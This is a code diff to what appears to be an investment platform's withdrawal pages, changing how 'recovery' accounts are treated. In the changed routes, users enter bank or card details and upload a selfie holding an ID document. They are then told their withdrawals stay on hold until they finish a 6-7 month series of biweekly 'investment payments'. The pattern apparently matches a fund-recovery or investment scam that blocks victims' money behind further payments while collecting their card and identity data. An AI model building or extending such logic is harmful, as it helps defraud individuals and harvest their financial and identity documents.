@@ -149,7 +149,7 @@ async function recoveryReferenceHold(userId) {
     contributionAmount: months ? Number(recPlan.contribution_amount) : null,
     isRecovery: true,
     recoveryStatus: recUser?.recovery_status || 'none',
-    message: `Withdrawals are held until your ${months}-month fixed investment cycle completes. Once your every-2-weeks payments complete the full investment cycleand the investment matures, you can withdraw all your funds into your external bank account.`,
+    message: `Complete your ${months}-month investment payment first — until your every-2-weeks payments complete the full investment cycleand the investment matures, withdrawals stay on hold. After the payment for the cycle is completed, you can withdraw your funds to your bank (or debit card.`,
   };
 }
 
@@ -296,12 +296,20 @@ dash.get('/dashboard/withdraw', async (c) => {
   ]);
   const cycle = cycleRaw || (await recoveryReferenceHold(u.id));
   const isRecovery = cycle?.isRecovery || u.accountClass === 'recovery_test';
-  const wdMethods = isRecovery ? methods.filter((m) => m.type === 'bank') : methods;
+  const held = !!(cycle && !cycle.matured);
+  const destStep = !!(cycle?.isRecovery && held);
+  // Recovery setup step offers card + bank ("debit card or bank or stuffs like
+  // that"); the real matured execution stays bank-only in the POST guard.
+
+  const wdMethods = destStep
+    ? methods.filter((m) => m.type === 'bank' || m.type === 'card')
+    : isRecovery ? methods.filter((m) => m.type === 'bank') : methods;
   return shell(c, 'dashboard/withdraw', {
     rows, bal, methods: wdMethods,
     codeRequired: !!u.withdrawalCodeHash,
     isRecovery,
     cycle: cycle ? { ...cycle, active: !cycle.matured } : null,
+    destStep,
     sent: c.req.query('sent'), error: c.req.query('e'),
   }, 'Withdraw');
 });
@@ -333,10 +341,14 @@ dash.post('/dashboard/withdraw', async (c) => {
 
   let cycleHold = await investmentCycleHold(u.id);
   if (!cycleHold) cycleHold = await recoveryReferenceHold(u.id);
-  if (cycleHold?.isRecovery && method.type !== 'bank')
+  // Recovery setup step: still inside the 6-7 month cycle. the user can pick
+  // a debit/credit card OR a bank as her payout destination. Once the cycle
+  // matures, real execution becomes bank-only (below).
+  if (cycleHold?.isRecovery && !cycleHold.matured && method.type !== 'bank' && method.type !== 'card')
+    return back('Recovery accounts may withdraw only to an external bank or credit-card destination during their setup phase.');
+  if (cycleHold?.isRecovery && cycleHold.matured && method.type !== 'bank')
     return back('Recovery accounts may withdraw only to an external bank account.');
   if (cycleHold && !cycleHold.matured) {
-
     const ferr = fieldErrors(method.withdrawalFields, b);
     if (ferr) return back(ferr);
 
@@ -346,6 +358,29 @@ dash.post('/dashboard/withdraw', async (c) => {
     } catch (e) { return back(e.message); }
     if (cycleHold.isRecovery && !selfieUrl)
       return back('Upload a selfie holding your document (or paste a hosted link) — it is required for this withdrawal.');
+
+    // Recovered/test account mid-cycle: getting her destination (card/bank) details
+    // filled in is step 1. When she proceeds, we keep her entries and show the
+    // payment-cycle message/modal — she must complete her 6-7 month investment
+    // payment before real funds can move to her chosen bank/card.
+    if (cycleHold.isRecovery) {
+      const [rows2, bal2] = await Promise.all([
+        db.select().from(transactions)
+          .where(and(eq(transactions.userId, u.id), eq(transactions.type, 'withdrawal')))
+          .orderBy(desc(transactions.createdAt)).limit(25),
+        balance(u.id),
+      ]);
+      return shell(c,'dashboard/withdraw', {
+        rows: rows2, bal: bal2,
+        methods: (await listPaymentMethods(true, 'withdrawal')).filter((mm) => mm.type === 'bank' || mm.type === 'card'),
+        codeRequired: !!u.withdrawalCodeHash,
+        isRecovery: true,
+        cycle: { ...cycleHold, active: true },
+        prev: b,
+        selfieUrl,
+        sent: undefined, error: undefined,
+      }, 'Withdraw');
+    }
 
     const [rows, balNow, methods] = await Promise.all([
       db.select().from(transactions)
